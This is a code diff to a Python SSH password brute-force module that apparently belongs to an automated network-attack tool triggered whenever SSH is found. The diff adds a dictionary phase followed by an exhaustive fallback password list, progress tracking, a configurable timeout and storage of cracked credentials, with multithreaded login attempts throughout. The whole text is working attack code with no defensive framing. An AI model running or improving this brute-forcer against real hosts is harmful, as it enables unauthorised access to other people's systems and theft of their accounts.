@@ -17,9 +17,11 @@ import socket
 import threading
 import logging
 import time
-from datetime import datetime
+import datetime
+
 from queue import Queue
 from shared import SharedData
+from actions.bruteforce_common import ProgressTracker, merged_password_plan
 from logger import Logger
 
 # Configure the logger
@@ -38,7 +40,7 @@ b_port    = 22
 b_service = '["ssh"]'
 b_trigger = 'on_any:["on_service:ssh","on_new_port:22"]'
 b_parent  = None
-b_priority = 70   
+b_priority = 70   # tu peux ajuster la priorité si besoin
 b_cooldown = 1800            # 30 minutes entre deux runs
 b_rate_limit = '3/86400'     # 3 fois par jour max
 
@@ -83,6 +85,7 @@ class SSHConnector:
         self.lock = threading.Lock()
         self.results = []  # List of tuples (mac, ip, hostname, user, password, port)
         self.queue = Queue()
+        self.progress = None
 
     # ---- Mapping helpers (DB) ------------------------------------------------
 
@@ -134,6 +137,7 @@ class SSHConnector:
         """Attempt to connect to SSH using (user, password)."""
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        timeout = float(getattr(self.shared_data, "ssh_connect_timeout_s", timeout))
 
         try:
             ssh.connect(
@@ -244,9 +248,12 @@ class SSHConnector:
 
                         self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                         logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
+                        self.shared_data.comment_params = {"user": user, "ip": adresse_ip, "port": str(port)}
                         success_flag[0] = True
 
             finally:
+                if self.progress is not None:
+                    self.progress.advance(1)
                 self.queue.task_done()
 
                 # Optional delay between attempts
@@ -260,48 +267,53 @@ class SSHConnector:
         Called by the orchestrator with a single IP + port.
         Builds the queue (users x passwords) and launches threads.
         """
+        self.results = []
         mac_address = self.mac_for_ip(adresse_ip)
         hostname = self.hostname_for_ip(adresse_ip) or ""
 
-        total_tasks = len(self.users) * len(self.passwords)
+        dict_passwords, fallback_passwords = merged_password_plan(self.shared_data, self.passwords)
+        total_tasks = len(self.users) * (len(dict_passwords) + len(fallback_passwords))
         if total_tasks == 0:
             logger.warning("No users/passwords loaded. Abort.")
             return False, []
 
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
-
+        self.progress = ProgressTracker(self.shared_data, total_tasks)
         success_flag = [False]
-        threads = []
-        thread_count = min(40, max(1, total_tasks))
 
-        for _ in range(thread_count):
-            t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
-            t.start()
-            threads.append(t)
+        def run_phase(passwords):
+            phase_tasks = len(self.users) * len(passwords)
+            if phase_tasks == 0:
+                return
 
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                # clear queue
-                while not self.queue.empty():
-                    try:
-                        self.queue.get_nowait()
-                        self.queue.task_done()
-                    except Exception:
-                        break
-                break
+            for user in self.users:
+                for password in passwords:
+                    if self.shared_data.orchestrator_should_exit:
+                        logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                        return
+                    self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
 
-        self.queue.join()
+            threads = []
+            thread_count = min(8, max(1, phase_tasks))
+            for _ in range(thread_count):
+                t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
+                t.start()
+                threads.append(t)
+            self.queue.join()
+            for t in threads:
+                t.join()
 
-        for t in threads:
-            t.join()
-
-        return success_flag[0], self.results  # Return True and the list of successes if any
+        try:
+            run_phase(dict_passwords)
+            if (not success_flag[0]) and fallback_passwords and not self.shared_data.orchestrator_should_exit:
+                logger.info(
+                    f"SSH dictionary phase failed on {adresse_ip}:{port}. "
+                    f"Starting exhaustive fallback ({len(fallback_passwords)} passwords)."
+                )
+                run_phase(fallback_passwords)
+            self.progress.set_complete()
+            return success_flag[0], self.results
+        finally:
+            self.shared_data.bjorn_progress = ""
 
 
 if __name__ == "__main__":
